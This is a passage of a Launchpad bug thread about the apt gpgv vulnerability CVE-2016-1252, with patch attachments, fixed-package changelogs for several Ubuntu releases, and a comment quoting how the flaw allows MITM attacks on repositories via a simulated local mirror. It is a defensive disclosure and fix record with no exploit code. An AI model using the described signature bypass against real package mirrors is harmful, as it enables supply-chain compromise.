            <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-08T15:08:35.695494+00:00" title="2016-12-08 15:08:35 UTC">on 2016-12-08</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/22"> #22</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+attachment/4789063/+files/apt_1.0.1ubuntu2.16.diff">updated trusty diff</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/apt/+bug/1647467/+attachment/4789063">Edit</a>
        (2.1 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/23" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-08T15:09:14.997927+00:00" title="2016-12-08 15:09:14 UTC">on 2016-12-08</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/23"> #23</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+attachment/4789064/+files/apt_1.2.15ubuntu0.1.diff">updated xenial-security debdiff</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/apt/+bug/1647467/+attachment/4789064">Edit</a>
        (2.9 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/24" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-08T15:09:37.189954+00:00" title="2016-12-08 15:09:37 UTC">on 2016-12-08</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/24"> #24</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+attachment/4789065/+files/apt_1.3.2.diff">updated yakkety-security debdiff</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/apt/+bug/1647467/+attachment/4789065">Edit</a>
        (12.0 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in apt (Ubuntu Zesty): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        In Progress &#8594; Fix Committed
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/25" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-13T02:36:10.793803+00:00" title="2016-12-13 02:36:10 UTC">on 2016-12-13</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/25"> #25</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hi Julian - I plan to publish the yakkety, xenial, and trusty apt security updates at 2016-12-13 17:00:00 UTC. Test results look good. Thanks for the debdiffs.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hi Julian - I plan to publish the yakkety, xenial, and trusty apt security updates at 2016-12-13 17:00:00 UTC. Test results look good. Thanks for the debdiffs.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/26" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-13T17:02:00.792412+00:00" title="2016-12-13 17:02:00 UTC">on 2016-12-13</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/26"> #26</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package apt - 1.3.2ubuntu0.1</p>
<p>---------------<br />
apt (1.3.2ubuntu0.1) yakkety-security; urgency=high</p>
<p>&nbsp;&nbsp;* Hack around Ubuntu rejecting symlink copyright<br />
&nbsp;&nbsp;* SECURITY UPDATE: gpgv: Check for errors when splitting files (CVE-2016-1252)<br />
&nbsp;&nbsp;&nbsp;&nbsp;Thanks to Jann Horn, Google Project Zero for reporting the issue<br />
&nbsp;&nbsp;&nbsp;&nbsp;(LP: <a href="/bugs/1647467" class="bug-link">#1647467</a>)<br />
&nbsp;&nbsp;* gpgv: Flush the files before checking for errors</p>
<p>&nbsp;-- Julian Andres Klode &lt;email address hidden&gt;  Thu, 08 Dec 2016 15:22:30 +0100</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug was fixed in the package apt - 1.3.2ubuntu0.1

---------------
apt (1.3.2ubuntu0.1) yakkety-security; urgency=high

  * Hack around Ubuntu rejecting symlink copyright
  * SECURITY UPDATE: gpgv: Check for errors when splitting files (CVE-2016-1252)
    Thanks to Jann Horn, Google Project Zero for reporting the issue
    (LP: #1647467)
  * gpgv: Flush the files before checking for errors

 -- Julian Andres Klode &lt;juliank@ubuntu.com&gt;  Thu, 08 Dec 2016 15:22:30 +0100</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in apt (Ubuntu Yakkety): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/27" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-13T17:02:03.963530+00:00" title="2016-12-13 17:02:03 UTC">on 2016-12-13</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/27"> #27</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package apt - 1.2.15ubuntu0.2</p>
<p>---------------<br />
apt (1.2.15ubuntu0.2) xenial-security; urgency=high</p>
<p>&nbsp;&nbsp;* SECURITY UPDATE: gpgv: Check for errors when splitting files (CVE-2016-1252)<br />
&nbsp;&nbsp;&nbsp;&nbsp;Thanks to Jann Horn, Google Project Zero for reporting the issue<br />
&nbsp;&nbsp;&nbsp;&nbsp;(LP: <a href="/bugs/1647467" class="bug-link">#1647467</a>)<br />
&nbsp;&nbsp;* gpgv: Flush the files before checking for errors</p>
<p>&nbsp;-- Julian Andres Klode &lt;email address hidden&gt;  Thu, 08 Dec 2016 15:28:08 +0100</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug was fixed in the package apt - 1.2.15ubuntu0.2

---------------
apt (1.2.15ubuntu0.2) xenial-security; urgency=high

  * SECURITY UPDATE: gpgv: Check for errors when splitting files (CVE-2016-1252)
    Thanks to Jann Horn, Google Project Zero for reporting the issue
    (LP: #1647467)
  * gpgv: Flush the files before checking for errors

 -- Julian Andres Klode &lt;juliank@ubuntu.com&gt;  Thu, 08 Dec 2016 15:28:08 +0100</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in apt (Ubuntu Xenial): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
    
    <time title="2016-12-13 17:05:00 UTC" datetime="2016-12-13T17:05:00.194304+00:00">on 2016-12-13</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>information type</b>:
      </td>
      <td>
        Private Security &#8594; Public Security
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/28" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-13T17:12:10.928392+00:00" title="2016-12-13 17:12:10 UTC">on 2016-12-13</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/28"> #28</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package apt - 1.0.1ubuntu2.17</p>
<p>---------------<br />
apt (1.0.1ubuntu2.17) trusty-security; urgency=high</p>
<p>&nbsp;&nbsp;* SECURITY UPDATE: gpgv: Check for errors when splitting files (CVE-2016-1252)<br />
&nbsp;&nbsp;&nbsp;&nbsp;Thanks to Jann Horn, Google Project Zero for reporting the issue<br />
&nbsp;&nbsp;&nbsp;&nbsp;(LP: <a href="/bugs/1647467" class="bug-link">#1647467</a>)</p>
<p>&nbsp;-- Julian Andres Klode &lt;email address hidden&gt;  Thu, 08 Dec 2016 15:31:29 +0100</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug was fixed in the package apt - 1.0.1ubuntu2.17

---------------
apt (1.0.1ubuntu2.17) trusty-security; urgency=high

  * SECURITY UPDATE: gpgv: Check for errors when splitting files (CVE-2016-1252)
    Thanks to Jann Horn, Google Project Zero for reporting the issue
    (LP: #1647467)

 -- Julian Andres Klode &lt;juliank@ubuntu.com&gt;  Thu, 08 Dec 2016 15:31:29 +0100</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in apt (Ubuntu Trusty): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~crichton" class="sprite person">Ubuntu Foundations Team Bug Bot (crichton)</a>
    
    <time title="2016-12-13 20:24:18 UTC" datetime="2016-12-13T20:24:18.664935+00:00">on 2016-12-13</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: patch
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/29" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~janitor" class="sprite person-inactive">Launchpad Janitor (janitor)</a>
            wrote
            <time itemprop="commentTime" datetime="2016-12-18T01:53:48.457272+00:00" title="2016-12-18 01:53:48 UTC">on 2016-12-18</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/29"> #29</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This bug was fixed in the package apt - 1.4~beta2</p>
<p>---------------<br />
apt (1.4~beta2) unstable; urgency=high</p>
<p>&nbsp;&nbsp;[ John R. Lenton ]<br />
&nbsp;&nbsp;* bash-completion: Only complete understood file paths for install<br />
&nbsp;&nbsp;&nbsp;&nbsp;(LP: <a href="/bugs/1645815" class="bug-link">#1645815</a>)</p>
<p>&nbsp;&nbsp;[ Julian Andres Klode ]<br />
&nbsp;&nbsp;* SECURITY UPDATE: gpgv: Check for errors when splitting files (CVE-2016-1252)<br />
&nbsp;&nbsp;&nbsp;&nbsp;Thanks to Jann Horn, Google Project Zero for reporting the issue<br />
&nbsp;&nbsp;&nbsp;&nbsp;(LP: <a href="/bugs/1647467" class="bug-link">#1647467</a>)<br />
&nbsp;&nbsp;* gpgv: Flush the files before checking for errors</p>
<p>&nbsp;-- Julian Andres Klode &lt;email address hidden&gt;  Thu, 08 Dec 2016 15:21:16 +0100</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This bug was fixed in the package apt - 1.4~beta2

---------------
apt (1.4~beta2) unstable; urgency=high

  [ John R. Lenton ]
  * bash-completion: Only complete understood file paths for install
    (LP: #1645815)

  [ Julian Andres Klode ]
  * SECURITY UPDATE: gpgv: Check for errors when splitting files (CVE-2016-1252)
    Thanks to Jann Horn, Google Project Zero for reporting the issue
    (LP: #1647467)
  * gpgv: Flush the files before checking for errors

 -- Julian Andres Klode &lt;jak@debian.org&gt;  Thu, 08 Dec 2016 15:21:16 +0100</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  <div class="boardCommentActivity">
    
      <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in apt (Ubuntu Zesty): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        Fix Committed &#8594; Fix Released
      </td>
    </tr>
  
</table>
    
    
  </div>
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~juliank" class="sprite person">Julian Andres Klode (juliank)</a>
    
    <time title="2017-01-10 23:35:26 UTC" datetime="2017-01-10T23:35:26.764884+00:00">on 2017-01-10</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      
    
    <tr>
      <td style="text-align: right;">
        <b>tags</b>:
      </td>
      <td>
        added: verification-done
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/30" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~brian-murray" class="sprite person">Brian Murray (brian-murray)</a>
            wrote
            <time itemprop="commentTime" datetime="2017-01-11T16:55:15.763047+00:00" title="2017-01-11 16:55:15 UTC">on 2017-01-11</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/ubuntu/+source/apt/+bug/1647467/comments/30">
                <strong>Update Released</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/30"> #30</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>The verification of the Stable Release Update for apt has completed successfully and the package has now been released to -updates.  Subsequently, the Ubuntu Stable Release Updates Team is being unsubscribed and will not receive messages about this bug report.  In the event that you encounter a regression using the package from -updates please report a new bug using ubuntu-bug and tag the bug report regression-update so we can easily find any regressions.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">The verification of the Stable Release Update for apt has completed successfully and the package has now been released to -updates.  Subsequently, the Ubuntu Stable Release Updates Team is being unsubscribed and will not receive messages about this bug report.  In the event that you encounter a regression using the package from -updates please report a new bug using ubuntu-bug and tag the bug report regression-update so we can easily find any regressions.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/apt/+bug/1647467/comments/31" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~aquina" class="sprite person">A. Denton (aquina)</a>
            wrote
            <time itemprop="commentTime" datetime="2019-01-29T23:42:55.292172+00:00" title="2019-01-29 23:42:55 UTC">on 2019-01-29</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/apt/+bug/1647467/comments/31"> #31</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p><span class="foldable-quoted">&gt; It allows for attacking a repository via MITM attacks, circumventing the signature of the InRelease file.
</span></p>
<p><span class="foldable-quoted">&gt; (&quot;deb <a rel="nofollow" href="http://192.168.0.2:1337/debian/">http://<wbr />192.168.<wbr />0.2:1337/<wbr />debian/</a> jessie-updates main&quot; or so). [..] This simulates a MITM attack or compromised mirror.
</span></p>
<p>That sounds like it matters, where that InRelease file comes from, right? When I look into my /etc/apt/<wbr />sources.<wbr />list, I only see deb/dev-src http://&lt;tld&gt;.archive.<wbr />ubuntu.<wbr />com/... entries.</p>
<p>I think it would be much better, if Canonical servers would require TLS 1.x encryption (STS preferred) and thusly identify themselves with a proper cert, so machines/users can make sure (nation-state actors not taken into account) who they&#x27;re talking to.</p>
<p>I think that would definitely make MITM and MOTS attacks more difficult. I&#x27;m aware of the signatures, i.e. present package security, though. Nonetheless, they do not seem to address the problem of transport security.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">&gt; It allows for attacking a repository via MITM attacks, circumventing the signature of the InRelease file.

&gt; ("deb http://192.168.0.2:1337/debian/ jessie-updates main" or so). [..] This simulates a MITM attack or compromised mirror.

That sounds like it matters, where that InRelease file comes from, right? When I look into my /etc/apt/sources.list, I only see deb/dev-src http://&lt;tld&gt;.archive.ubuntu.com/... entries.

I think it would be much better, if Canonical servers would require TLS 1.x encryption (STS preferred) and thusly identify themselves with a proper cert, so machines/users can make sure (nation-state actors not taken into account) who they're talking to.

I think that would definitely make MITM and MOTS attacks more difficult. I'm aware of the signatures, i.e. present package security, though. Nonetheless, they do not seem to address the problem of transport security.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        <div style="float: right;">
          <a class="menu-link-activitylog" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+activity">See full activity log</a>
        </div>
        <div class="clearfix"></div>

        
          

          
            <div align="center" id="add-comment-login-first">
              To post a comment you must <a href="+login?comments=all">log in</a>.
            </div>
          
        
        
      

      </div><!-- class="top-portlet" -->
      </div><!--- id="maincontentsub"-->
      <div>
        <div id="duplicate-form-container"></div>
        <div id="privacy-form-container"></div>
      </div>
    </div>
            
            
          </div><!-- yui-b -->
        </div><!-- yui-main -->

        
          <div id="side-portlets" class="yui-b side">
            
      <div id="involvement" class="portlet">
        <ul class="involvement">
          <li class="single">
            <a class="sprite bugs" href="/ubuntu/+source/apt/+filebug">
              Report a bug
            </a>
          </li>
        </ul>
      </div>
      <div id="privacy" class="first portlet public">
  <div id="privacy-text">
     <span id="information-type-summary" class="sprite public">This report contains
         <strong id="information-type">Public Security</strong>
         information
     </span>&nbsp;<a class="sprite edit action-icon" id="privacy-link" href="/ubuntu/+source/apt/+bug/1647467/+secrecy">Edit</a>

     <div id="information-type-description" style="padding-top: 5px">Everyone can see this security related information.
</div>
  </div>
</div>

      <div id="portlet-actions" class="portlet vertical">
  <ul id="duplicate-actions">
    <li class="sprite bug-dupe">
    <span id="mark-duplicate-text">
    <a class="menu-link-mark-dupe" href="/ubuntu/+source/apt/+bug/1647467/+duplicate">Mark as duplicate</a>
    </span>
    </li>
    
    <li><a class="menu-link-createquestion sprite add" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+create-question">Convert to a question</a></li>
    
    <li><a class="menu-link-addbranch sprite add" href="https://bugs.launchpad.net/ubuntu/+source/apt/+bug/1647467/+addbranch">Link a related branch</a></li>
